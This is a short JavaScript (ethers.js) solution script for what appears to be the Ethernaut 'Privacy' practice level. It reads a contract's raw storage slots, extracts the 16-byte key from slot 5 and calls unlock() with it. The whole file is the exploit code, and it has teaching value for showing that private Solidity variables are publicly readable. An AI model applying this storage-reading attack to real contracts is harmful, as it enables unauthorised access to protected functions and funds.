let { ethers } = require('ethers');
let ABI = require('./ABI.json');

let PRIVATE_KEY = ""
let network = ""

let Contract_address = "0x57cC574e44240932FD99f8009C4fD825B39A674E";                   // contract Privacy 2nd wala 

let provider = new ethers.providers.JsonRpcProvider(network);                        // read from blockchain
let signer = new ethers.Wallet(PRIVATE_KEY, provider);                              //  write on blockchain
let i = new ethers.Contract(Contract_address,ABI,signer);                          // contract_instance

let main = async()=>
{
    let Print_1st_10_slots = async()=>
    {
        for (let slot = 0; slot < 10; slot++)
        {
            console.log(`[${slot}]` + 
            await provider.getStorageAt(Contract_address, slot));
        }
    }
   
    let j = await provider.getStorageAt(Contract_address, 5);  // 5th slot

                                // requirement in Question
    j=j.slice(0,34);           // bytes16 = 32 hexadecimal
    console.log(j); 


    await Print_1st_10_slots();
    let tx = await i.unlock(j);
    await tx.wait();
    await Print_1st_10_slots();
    

}

main().catch((error) => 
{
    console.log("Error aagya ===")
    console.error(error);
});
// Output: a hexadecimal string representing the value






